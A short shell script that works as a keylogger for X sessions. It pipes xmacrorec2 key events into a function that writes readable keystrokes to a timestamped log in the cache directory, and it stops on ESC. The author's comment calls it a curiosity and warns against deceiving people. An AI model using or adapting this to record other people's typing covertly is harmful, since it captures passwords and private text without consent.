#!/bin/sh
#
# Stores keyboard presses in a log file
# the logging is stopped pressing the ESC button
# This script is done just out of curiosity, 
# don't use it to deceive people.
#
# Needs xmacro installed

LOG=${XDG_CACHE_HOME:-"$HOME/.cache"}/$(date +%F_%H%M).log

function log() {
    while true
    do
	read key || break

	# remove first 12 chars
	key=${key:12}

	case $key in
	    ?)  # alphanumeric keystroke
		echo -n $key
		;;
	    space)
		echo -n " "
		;;
	    apostrophe)
		echo -n \'
		;;
	    comma)
		echo -n ','
		;;
	    period)
		echo -n '.'
		;;
	    minus)
		echo -n "-"
		;;
	    BackSpace)
		echo -n "«"
		;;
	    Delete)
		echo -n "»"
		;;
	    ISO_Level3_Shift) # AltGr
		echo -n "¬"
		;;
	    Shift_?)
		echo -n "^"
		;;
	    Control_?)
		echo -ne "\nC^"
		;;
	    Super_?)
		echo -ne "\nS^"
		;;
	    *)
		# add a newline
		echo " «$key»"
		;;
	esac
    done
}

xmacrorec2 -k 9 | grep KeyStrPress | log > $LOG

echo "Writen to \"$LOG\""

